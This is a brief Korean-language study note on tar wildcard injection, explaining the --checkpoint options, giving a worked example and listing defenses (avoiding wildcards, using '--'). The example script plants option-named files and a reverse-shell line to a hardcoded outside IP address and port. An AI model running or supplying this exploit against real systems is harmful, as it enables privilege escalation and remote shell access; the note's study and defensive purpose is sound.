# Tar Wildcard Injection
- Wildcard 문자를 사용하면 `tar` 명령은 특정 패턴과 일치하는 모든 파일을 포함하게 되는데, 예를 들어, 공격자가 시스템에 `--checkpoint-action=exec=sh exploit.sh` 와 같은 파일명을 생성하면, tar가 이 패턴과 일치하는 파일을 찾을 때 공격자의 스크립트가 실행되게 할 수 있다는 점을 이용한 취약점임

---
# `--checkpoint-action=exec`, `--checkpoint` option
- `--checkpoint-action=exec` 옵션은 `tar` 아카이브 생성 또는 추출 과정에서 특정 체크포인트마다 특정 쉘 명령을 자동으로 실행하도록 설정하는 기능
- `checkpoint` 옵션은 몇 개의 레코드(record)를 처리할 때마다 체크포인트를 생성할 것인지를 지정
- 이러한 옵션은 일반적으로 로깅, 모니터링 등을 돕기 위해 있는 옵션임

---
# Wildcard
- `*`
- 리눅스에서 해당 디렉토리에 있는 모든 파일을 나타냄

---
# Example
- 예를들어 공격자가 파일업로드를 할 수 있는 벡터를 찾았는데, 업로드한 파일들을 주기적으로 tar를 통해서 백업을 하고, 이렇게 백업을 할때 와일드 카드를 사용해서 백업을 하는 상황이 있을 때 이러한 취약점을 이용할 수 있음
```sh
echo "#! /bin/bash" > shell.sh
echo "bash -c 'bash -i >& /dev/tcp/211.250.216.249/7000 0>&1'" >> shell.sh
echo "" > "--checkpoint-action=exec=./shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

- 지금은 파일을 실행하는 형태이지만, 어렵다면 파일이 아니라 직접 명령어를 실행해도 괜찮음

---
# Defense
- 와일드카드를 사용을 지양함
- 와일드카드를 사용해야 한다면, `--` 을 명시하여 옵션이 끝났음을 명시하면 됨


---
# Source
- [참고1](!https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
- [참고2](!https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)